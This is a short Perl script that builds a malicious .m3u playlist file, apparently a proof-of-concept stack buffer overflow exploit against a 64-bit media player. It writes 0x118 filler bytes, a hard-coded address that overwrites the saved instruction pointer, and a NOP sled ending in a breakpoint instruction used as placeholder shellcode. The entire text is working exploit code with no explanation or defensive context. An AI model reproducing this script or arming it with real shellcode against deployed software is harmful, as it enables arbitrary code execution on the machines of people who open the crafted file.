my $file = "AttackBreak64.m3u";
my $junk = "\x41" x 0x118;
my $rip = "\xC9\x61\x0F\x62\xF8\x7F\x00\x00";
my $shellcode = "\x90" x 25; # 0x90 = NOP
$shellcode = $shellcode."\xCC"; # 0xCC = Break
open($FILE, ">$file");
print $FILE $junk.$rip.$shellcode;close($FILE);
print "m3u File Created Successfully \n";